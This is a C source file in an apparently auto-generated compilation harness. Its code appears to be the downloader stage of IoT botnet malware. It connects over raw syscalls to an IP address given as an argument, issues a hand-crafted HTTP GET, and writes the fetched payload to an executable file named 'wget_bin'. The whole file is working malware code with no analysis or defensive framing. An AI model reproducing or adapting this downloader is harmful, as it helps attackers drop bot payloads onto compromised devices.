#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
typedef  int /*<<< orphan*/  recvbuf ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 char* DOWNLOAD_MSG ; 
 int DOWNLOAD_MSG_LEN ; 
 char* EXEC_MSG ; 
 int EXEC_MSG_LEN ; 
 int /*<<< orphan*/  HTONS (int) ; 
 int O_CREAT ; 
 int O_TRUNC ; 
 int O_WRONLY ; 
 int /*<<< orphan*/  SCN (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int STDOUT ; 
 int /*<<< orphan*/  SYS_close ; 
 int /*<<< orphan*/  SYS_exit ; 
 int /*<<< orphan*/  SYS_open ; 
 int /*<<< orphan*/  SYS_read ; 
 int /*<<< orphan*/  SYS_socketcall ; 
 int /*<<< orphan*/  SYS_write ; 
 int /*<<< orphan*/  __exit (int) ; 
 int /*<<< orphan*/  close (int) ; 
 int connect (int,struct sockaddr_in*,int) ; 
 int /*<<< orphan*/  inet_addr (char*) ; 
 int open (char*,int,int) ; 
 int read (int,char*,int) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int strlen (char*) ; 
 int syscall (int /*<<< orphan*/ ,...) ; 
 int /*<<< orphan*/  write (int,char*,int) ; 

int main(int argc, char **args)
{
    char recvbuf[128];
    struct sockaddr_in addr;
    int sfd, ffd;
    unsigned int header_parser = 0;

    write(STDOUT, EXEC_MSG, EXEC_MSG_LEN);

    addr.sin_family = AF_INET;
    addr.sin_port = HTONS(80);
    addr.sin_addr.s_addr = inet_addr(args[1]);

    ffd = open("wget_bin", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    sfd = socket(AF_INET, SOCK_STREAM, 0);

#ifdef DEBUG
    if (ffd == -1)
        printf("Failed to open file!\n");
    if (sfd == -1)
        printf("Failed to call socket()\n");
#endif

    if (sfd == -1 || ffd == -1)
        __exit(1);

    if (connect(sfd, &addr, sizeof (struct sockaddr_in)) == -1)
        __exit(2);

    write(sfd, "GET ", 4);
    write(sfd, args[2], strlen(args[2]));
    write(sfd, " HTTP/1.1\r\n", 11);
    write(sfd, "Host: ", 6);
    write(sfd, args[3], strlen(args[3]));
    write(sfd, "\r\nConnection: close\r\n\r\n", 23);

    while (header_parser != 0x0d0a0d0a)
    {
        char ch;
        int ret = read(sfd, &ch, 1);

        if (ret != 1)
            __exit(4);
        header_parser = (header_parser << 8) | ch;
    }
#ifdef DEBUG
    printf("Finished receiving HTTP header\n");
#endif

    while (1)
    {
        int ret = read(sfd, recvbuf, sizeof (recvbuf));

        if (ret <= 0)
            break;
        write(ffd, recvbuf, ret);
    }

    close(sfd);
    close(ffd);
    write(STDOUT, DOWNLOAD_MSG, DOWNLOAD_MSG_LEN);
    __exit(5);
}

int xsocket(int domain, int type, int protocol)
{
#if !defined(__NR_socket)
    struct {
        int domain, type, protocol;
    } socketcall;
    socketcall.domain = domain;
    socketcall.type = type;
    socketcall.protocol = protocol;
    return syscall(SCN(SYS_socketcall), 1 /* SYS_SOCKET */, &socketcall);
#else
    return syscall(SCN(SYS_socket), domain, type, protocol);
#endif
}

int xread(int fd, void *buf, int len)
{
    return syscall(SCN(SYS_read), fd, buf, len);
}

int xwrite(int fd, void *buf, int len)
{
    return syscall(SCN(SYS_write), fd, buf, len);
}

int xconnect(int fd, struct sockaddr_in *addr, int len)
{
#if !defined(__NR_socket)
    struct {
        int fd;
        struct sockaddr_in *addr;
        int len;
    } socketcall;
    socketcall.fd = fd;
    socketcall.addr = addr;
    socketcall.len = len;
    return syscall(SCN(SYS_socketcall), 3 /* SYS_CONNECT */, &socketcall);
#else
    return syscall(SCN(SYS_connect), fd, addr, len);
#endif
}

int xopen(char *path, int flags, int other)
{
    return syscall(SCN(SYS_open), path, flags, other);
}

int xclose(int fd)
{
    return syscall(SCN(SYS_close), fd);
}

void x__exit(int code)
{
    syscall(SCN(SYS_exit), code);
}

